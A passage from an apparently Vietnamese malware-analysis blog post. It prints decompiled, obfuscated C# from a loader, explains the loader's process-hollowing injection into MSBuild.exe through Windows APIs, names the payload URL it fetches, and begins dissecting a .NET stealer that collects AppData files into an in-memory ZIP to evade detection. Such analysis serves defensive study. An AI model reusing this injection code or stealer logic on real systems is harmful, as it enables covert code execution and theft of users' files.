class="built_in">bool</span> flag2;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> (num2 ^ \uE00E.\uE006(<span class="number">29</span>))</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">44</span>:</span><br><span class="line">              numArray1[\uE00E.\uE006(<span class="number">2</span>)] = \uE00E.\uE006(<span class="number">7</span>);</span><br><span class="line">              num2 = \uE00E.\uE006(<span class="number">48</span>);</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">45</span>:</span><br><span class="line">              numArray1 = <span class="keyword">new</span> <span class="built_in">int</span>[\uE00E.\uE006(<span class="number">6</span>)];</span><br><span class="line">              num2 = <span class="number">15</span>;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">46</span>:</span><br><span class="line">              num3 = \uF175.\uF16F(_param2, checked (num1 + \uE00E.\uE006(<span class="number">5</span>)));</span><br><span class="line">              num2 = <span class="number">14</span>;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">47</span>:</span><br><span class="line">              <span class="keyword">if</span> (flag2)</span><br><span class="line">              &#123;</span><br><span class="line">                num2 = <span class="number">18</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">goto</span> label_18;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">48</span>:</span><br><span class="line">              flag2 = \uF176.\uF16F() == \uE00E.\uE006(<span class="number">3</span>);</span><br><span class="line">              num2 = <span class="number">12</span>;</span><br><span class="line">              <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">49</span>:</span><br><span class="line">              <span class="keyword">goto</span> label_17;</span><br><span class="line">            <span class="literal">default</span>:</span><br><span class="line">              <span class="keyword">goto</span> label_10;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">label_17:</span><br><span class="line">        <span class="built_in">int</span> num4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> label_19;</span><br><span class="line">label_18:</span><br><span class="line">        num4 = <span class="number">1</span>;</span><br><span class="line">label_19:</span><br><span class="line">        <span class="keyword">if</span> (num4 == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (((Class1.\uE001(obj2.\uE001, numArray1) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (((Class1.\uE002(obj2.\uE001, numArray1) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="built_in">int</span> num5 = numArray1[\uE00E.\uE006(<span class="number">8</span>)];</span><br><span class="line">        <span class="built_in">int</span> num6 = \uE00E.\uE006(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">int</span> num7 = \uE00E.\uE006(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (((Class1.\uE005(obj2.\uE000, checked (num5 + \uE00E.\uE006(<span class="number">9</span>)), <span class="keyword">ref</span> num6, \uE00E.\uE006(<span class="number">3</span>), <span class="keyword">ref</span> num7) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="keyword">if</span> ((!(num3 != num6 ? \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span> : (<span class="built_in">uint</span>) Class1.\uE007(obj2.\uE000, num6) &gt; (<span class="built_in">uint</span>) \uE00E.\uE006(<span class="number">2</span>)) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="built_in">int</span> num8 = \uF175.\uF16F(_param2, checked (num1 + \uE00E.\uE006(<span class="number">10</span>)));</span><br><span class="line">        <span class="built_in">int</span> num9 = \uF175.\uF16F(_param2, checked (num1 + \uE00E.\uE006(<span class="number">11</span>)));</span><br><span class="line">        <span class="built_in">int</span> num10 = Class1.\uE008(obj2.\uE000, num3, num8, \uE00E.\uE006(<span class="number">12</span>), \uE00E.\uE006(<span class="number">13</span>));</span><br><span class="line">        <span class="built_in">bool</span> flag3 = \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ((!((!_param3 ? <span class="number">0</span> : <span class="number">1</span>) != <span class="number">0</span> ? \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span> : num10 == \uE00E.\uE006(<span class="number">2</span>)) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          flag3 = \uE00E.\uE006(<span class="number">0</span>) != <span class="number">0</span>;</span><br><span class="line">          num10 = Class1.\uE008(obj2.\uE000, \uE00E.\uE006(<span class="number">2</span>), num8, \uE00E.\uE006(<span class="number">12</span>), \uE00E.\uE006(<span class="number">13</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((num10 != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="keyword">if</span> (((Class1.\uE006(obj2.\uE000, num10, _param2, num9, <span class="keyword">ref</span> num7) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="built_in">int</span> num11 = checked (num1 + \uE00E.\uE006(<span class="number">14</span>));</span><br><span class="line">        <span class="built_in">int</span> num12 = checked ((<span class="built_in">int</span>) \uF177.\uF16F(_param2, num1 + \uE00E.\uE006(<span class="number">15</span>)) - \uE00E.\uE006(<span class="number">0</span>));</span><br><span class="line">        <span class="built_in">int</span> num13 = \uE00E.\uE006(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">while</span> (((num13 &gt; num12 ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">0</span> : <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">int</span> num14 = \uF175.\uF16F(_param2, checked (num11 + \uE00E.\uE006(<span class="number">16</span>)));</span><br><span class="line">          <span class="built_in">int</span> num15 = \uF175.\uF16F(_param2, checked (num11 + \uE00E.\uE006(<span class="number">17</span>)));</span><br><span class="line">          <span class="built_in">int</span> num16 = \uF175.\uF16F(_param2, checked (num11 + \uE00E.\uE006(<span class="number">18</span>)));</span><br><span class="line">          <span class="keyword">if</span> (((<span class="built_in">uint</span>) num15 &lt;= (<span class="built_in">uint</span>) \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">label_37:</span><br><span class="line">            <span class="built_in">int</span> num17 = \uE018.\uE030(<span class="number">28</span>);</span><br><span class="line">            <span class="built_in">byte</span>[] numArray2;</span><br><span class="line">            <span class="built_in">bool</span> flag4;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">switch</span> ((num17 ^ \uE00E.\uE006(<span class="number">29</span>)) + <span class="number">39</span>)</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                  \uF178.\uF16F((Array) _param2, num16, (Array) numArray2, \uE00E.\uE006(<span class="number">2</span>), numArray2.Length);</span><br><span class="line">                  num17 = <span class="number">-1</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                  <span class="keyword">if</span> (flag4)</span><br><span class="line">                  &#123;</span><br><span class="line">                    num17 = <span class="number">-3</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">goto</span> label_45;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                  numArray2 = <span class="keyword">new</span> <span class="built_in">byte</span>[checked (num15 - \uE00E.\uE006(<span class="number">0</span>) + \uE00E.\uE006(<span class="number">0</span>))];</span><br><span class="line">                  num17 = <span class="number">-6</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                  num17 = <span class="number">-2</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                  flag4 = (Class1.\uE006(obj2.\uE000, checked (num10 + num14), numArray2, numArray2.Length, <span class="keyword">ref</span> num7) ? <span class="number">1</span> : <span class="number">0</span>) == \uE00E.\uE006(<span class="number">2</span>);</span><br><span class="line">                  num17 = <span class="number">-7</span>;</span><br><span class="line">                  <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                  <span class="keyword">goto</span> label_44;</span><br><span class="line">                <span class="literal">default</span>:</span><br><span class="line">                  <span class="keyword">goto</span> label_37;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">label_44:</span><br><span class="line">            <span class="built_in">int</span> num18 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> label_46;</span><br><span class="line">label_45:</span><br><span class="line">            num18 = <span class="number">1</span>;</span><br><span class="line">label_46:</span><br><span class="line">            <span class="keyword">if</span> (num18 == <span class="number">0</span>)</span><br><span class="line">              <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">          &#125;</span><br><span class="line">          checked &#123; num11 += \uE00E.\uE006(<span class="number">19</span>); &#125;</span><br><span class="line">          checked &#123; num13 += \uE00E.\uE006(<span class="number">0</span>); &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">byte</span>[] numArray3 = \uF179.\uF16F(num10);</span><br><span class="line">        <span class="keyword">if</span> (((Class1.\uE006(obj2.\uE000, checked (num5 + \uE00E.\uE006(<span class="number">9</span>)), numArray3, \uE00E.\uE006(<span class="number">3</span>), <span class="keyword">ref</span> num7) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="built_in">int</span> num19 = \uF175.\uF16F(_param2, checked (num1 + \uE00E.\uE006(<span class="number">19</span>)));</span><br><span class="line">        <span class="keyword">if</span> ((!flag3 ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          num10 = num3;</span><br><span class="line">        numArray1[\uE00E.\uE006(<span class="number">20</span>)] = checked (num10 + num19);</span><br><span class="line">        <span class="keyword">if</span> ((\uF176.\uF16F() != \uE00E.\uE006(<span class="number">3</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (((Class1.\uE003(obj2.\uE001, numArray1) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (((Class1.\uE004(obj2.\uE001, numArray1) ? <span class="number">1</span> : <span class="number">0</span>) != \uE00E.\uE006(<span class="number">2</span>) ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">        <span class="keyword">if</span> ((Class1.\uE009(obj2.\uE001) != <span class="number">-1</span> ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">throw</span> \uF174.\uF16F();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">      &#123;</span><br><span class="line">        \uF17A.\uF16F(ex);</span><br><span class="line">        Process process = \uF17B.\uF16F(checked ((<span class="built_in">int</span>) obj2.\uE002));</span><br><span class="line">        <span class="keyword">if</span> ((process == <span class="literal">null</span> ? <span class="number">0</span> : <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">          \uF17C.\uF16F((<span class="built_in">object</span>) process);</span><br><span class="line">        flag1 = \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span>;</span><br><span class="line">        \uF17D.\uF16F();</span><br><span class="line">        <span class="keyword">goto</span> label_65;</span><br><span class="line">      &#125;</span><br><span class="line">      flag1 = \uE00E.\uE006(<span class="number">0</span>) != <span class="number">0</span>;</span><br><span class="line">label_65:</span><br><span class="line">      <span class="keyword">return</span> flag1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">StructLayout(LayoutKind.Sequential, Pack = 1)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">struct</span> \uE000</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">public</span> IntPtr \uE000;</span><br><span class="line">      <span class="keyword">public</span> IntPtr \uE001;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">uint</span> \uE002;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">uint</span> \uE003;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">StructLayout(LayoutKind.Sequential, Pack = 1)</span>]</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">struct</span> \uE001</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">uint</span> \uE000;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">string</span> \uE001;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">string</span> \uE002;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">string</span> \uE003;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE004;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE005;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE006;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE007;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE008;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE009;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE00A;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">int</span> \uE00B;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">short</span> \uE00C;</span><br><span class="line">      <span class="keyword">public</span> <span class="built_in">short</span> \uE00D;</span><br><span class="line">      <span class="keyword">public</span> IntPtr \uE00E;</span><br><span class="line">      <span class="keyword">public</span> IntPtr \uE00F;</span><br><span class="line">      <span class="keyword">public</span> IntPtr \uE010;</span><br><span class="line">      <span class="keyword">public</span> IntPtr \uE011;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Nhìn sơ qua class này, với các Windows API quen thuộc được sử dụng, ta có thể nhận ra ngay nó đang sử dụng kỹ thuật Process Hollowing.</p>
<p>Đầu tiên nó sử dụng <code>CreateProcess</code> để khởi động MSBuild.exe ở trạng thái treo (CREATE_SUSPENDED).</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class1.\uE000(_param0, str, IntPtr.Zero, IntPtr.Zero, \uE00E.\uE006(<span class="number">2</span>) != <span class="number">0</span>, (<span class="built_in">uint</span>) \uE00E.\uE006(<span class="number">3</span>), IntPtr.Zero, (<span class="built_in">string</span>) <span class="literal">null</span>, <span class="keyword">ref</span> obj1, <span class="keyword">ref</span> obj2)</span><br></pre></td></tr></table></figure></div>

<p>Nó call CreateProcess trong Windows API với tham số (uint) <code>\uE00E.\uE006(3)</code> tương ứng với flag <code>CREATE_SUSPENDED</code> (giá trị 0x00000004), cho biết tiến trình được tạo ra ở trạng thái treo. _param0 là đường dẫn đến legit process ở đây là MSBuild.</p>
<p>Tiếp theo nó call <code>GetThreadContext</code> và <code>Wow64GetThreadContext</code> để lấy thông tin của thread để truy cập các thanh ghi quan trọng (như EIP hoặc RIP), từ đó xác định điểm bắt đầu thực thi. Dữ liệu được lưu vào mảng numArray1.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class1.\uE001(obj2.\uE001, numArray1)  <span class="comment">// GetThreadContext</span></span><br><span class="line">Class1.\uE002(obj2.\uE001, numArray1)  <span class="comment">// Wow64GetThreadContext</span></span><br></pre></td></tr></table></figure></div>

<p>Nó gọi <code>ReadProcessMemory</code> để đọc dữ liệu từ memory của process đang bị suspended để lấy thông tin của base address.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class1.\uE005(obj2.\uE000, checked (num5 + \uE00E.\uE006(<span class="number">9</span>)), <span class="keyword">ref</span> num6, \uE00E.\uE006(<span class="number">3</span>), <span class="keyword">ref</span> num7)  <span class="comment">// ReadProcessMemory</span></span><br></pre></td></tr></table></figure></div>

<p>Gọi <code>NtUnmapViewOfSection</code> để xóa vùng nhớ gốc của process để chuẩn bị inject infected code vào đó.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class1.\uE007(obj2.\uE000, num6)  <span class="comment">// NtUnmapViewOfSection</span></span><br></pre></td></tr></table></figure></div>

<p>Sử dụng <code>VirtualAllocEx</code> cấp phát một vùng bộ nhớ mới trong tiến trình để chứa mã injected code.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> num10 = Class1.\uE008(obj2.\uE000, num3, num8, \uE00E.\uE006(<span class="number">12</span>), \uE00E.\uE006(<span class="number">13</span>))  <span class="comment">// VirtualAllocEx</span></span><br></pre></td></tr></table></figure></div>

<p>Và cuối cùng write mã độc vào vùng nhớ đã đc cấp phát bằng <code>WriteProcessMemory</code>.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class1.\uE006(obj2.\uE000, num10, _param2, num9, <span class="keyword">ref</span> num7)  <span class="comment">// WriteProcessMemory</span></span><br></pre></td></tr></table></figure></div>

<p>Sau khi đã inject được shellcode vào vùng nhớ đó, sử dụng <code>ResumeThread</code> để khôi phục trạng thái của thread, từ đó mã độc hại được thực thi trong trong legit process là MSBuild.</p>
<p>Nói tóm gọn lại đây là một <code>loader</code> và nó thực hiện kỹ thuật process hollowing để thực thi file payload <code>http://jilas.net/files/222.txt</code> đã được xử lý vào process <code>MSBuild.exe</code>.</p>
<h3 id="Reverse-1-2"><a href="#Reverse-1-2" class="headerlink" title="Reverse 1.2"></a>Reverse 1.2</h3><p>Sau khi phân tích loader, ta sẽ bước vào phân tích con mã độc mà loader xử lý.</p>
<p>Sử dụng DIE, ta biết nó compile bằng .NET, sử dụng trình DnSpy để decompile.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware12.png"
                      alt="image"
                ></p>
<p>Quan sát ở class <code>cadusasinput</code>, phương thức vequduqinput() lấy thư mục ApplicationData của người dùng (thông thường là “AppData\Roaming”) và nối thêm vào một chuỗi được mã hóa Base64.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span>[] <span class="title">vequduqinput</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">string</span> str;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String(\u003CModule\u003E.gejavipizotuhec(cadusasinput.cadusasinput.netapacocegadeherin(), cadusasinput.cadusasinput.fay(), cadusasinput.cadusasinput.wigtemp(), cadusasinput.cadusasinput.newoyidagij(), cadusasinput.cadusasinput.vezakujuzag(), cadusasinput.cadusasinput.jufajusoutput())));</span><br><span class="line">          num = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">0</span>)</span><br><span class="line">          num = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (num != <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">string</span>[<span class="number">2</span>]</span><br><span class="line">      &#123;</span><br><span class="line">        str + Encoding.UTF8.GetString(Convert.FromBase64String(\u003CModule\u003E.gejavipizotuhec(cadusasinput.cadusasinput.jedazubipak(), cadusasinput.cadusasinput.mokubohixemuwul(), cadusasinput.cadusasinput.konarositerator(), cadusasinput.cadusasinput.fememupikacecoqetulresult(), cadusasinput.cadusasinput.mojekowarovudelinput(), cadusasinput.cadusasinput.hebudasolexuwepivuxdata()))),</span><br><span class="line">        str + Encoding.UTF8.GetString(Convert.FromBase64String(\u003CModule\u003E.gejavipizotuhec(cadusasinput.cadusasinput.zejemav(), cadusasinput.cadusasinput.relinaqeyowivuroneq(), cadusasinput.cadusasinput.patuper(), cadusasinput.cadusasinput.fumisolopigvalue(), cadusasinput.cadusasinput.cemixaj(), cadusasinput.cadusasinput.zidarozuyoj())))</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Chuỗi này được giải mã bằng hàm <code>gejavipizotuhec</code>, có khả năng thực hiện các thao tác giải mã hoặc biến đổi chuỗi dựa trên các tham số được tạo ra khi chạy.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> \<span class="title">u003CModule</span>\<span class="title">u003E</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">gejavipizotuhec</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    [In] <span class="built_in">string</span> obj0,</span></span></span><br><span class="line"><span class="params"><span class="function">    [In] <span class="built_in">int</span> obj1,</span></span></span><br><span class="line"><span class="params"><span class="function">    [In] <span class="built_in">int</span> obj2,</span></span></span><br><span class="line"><span class="params"><span class="function">    [In] <span class="built_in">int</span> obj3,</span></span></span><br><span class="line"><span class="params"><span class="function">    [In] <span class="built_in">int</span> obj4,</span></span></span><br><span class="line"><span class="params"><span class="function">    [In] <span class="built_in">int</span> obj5</span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">int</span> num1 = <span class="number">78787878</span> + <span class="number">7878</span> - <span class="number">7878</span>;</span><br><span class="line">    <span class="built_in">int</span> num2 = <span class="number">474059</span> + <span class="number">5941</span> + <span class="number">5941</span>;</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="built_in">char</span>[] charArray = obj0.ToCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> index = <span class="number">0</span> + <span class="number">0</span> - <span class="number">0</span>; index &lt; charArray.Length; index += <span class="number">1</span> - <span class="number">1</span> + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">char</span> ch = charArray[index];</span><br><span class="line">      stringBuilder.Append((<span class="built_in">char</span>) ((<span class="built_in">uint</span>) ch - (<span class="built_in">uint</span>) obj2));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">int</span> num3 = <span class="number">5859</span> + <span class="number">4141</span> + <span class="number">4141</span>;</span><br><span class="line">    <span class="built_in">int</span> num4 = <span class="number">1548174</span> + <span class="number">8174</span> - <span class="number">8174</span>;</span><br><span class="line">    <span class="keyword">return</span> stringBuilder.ToString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Ta có thể thấy các phương thức tương tự để mã hóa đường dẫn cụ thể của một folder bên trong source code.</p>
<p>Tiếp đó, ta để ý thấy rằng trong source code còn sử dụng <code>ZipArchive</code> để nén các file và thư mục từ một đường dẫn chỉ định vào một file ZIP lưu trữ trong memory. Việc nén dữ liệu trong memory thay vì write trực tiếp lên ổ đĩa giúp tránh bị phát hiện bởi các phần mềm Endpoint.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">using</span> (ZipArchive zipArchive = <span class="keyword">new</span> ZipArchive((Stream) memoryStream, ZipArchiveMode.Create, <span class="literal">true</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">string</span>[] directories = Directory.GetDirectories(path);</span><br><span class="line">        <span class="built_in">string</span>[] files = Directory.GetFiles(path);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">string</span> str <span class="keyword">in</span> directories)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">string</span> haxosuctemp = Path.Combine(<span class="keyword">new</span> DirectoryInfo(str).Name, <span class="built_in">string</span>.Empty);</span><br><span class="line">          peqijotunogasafiraddata.peqijotunogasafiraddata.jocufocosowihikehen(str, zipArchive, haxosuctemp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="built_in">string</span> str <span class="keyword">in</span> files)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">string</span> name = <span class="keyword">new</span> FileInfo(str).Name;</span><br><span class="line">          <span class="keyword">using</span> (FileStream rufuzajakab = <span class="keyword">new</span> FileStream(str, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))</span><br><span class="line">            peqijotunogasafiraddata.peqijotunogasafiraddata.sorarucofekuguy((Stream) rufuzajakab, name, zipArchive);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      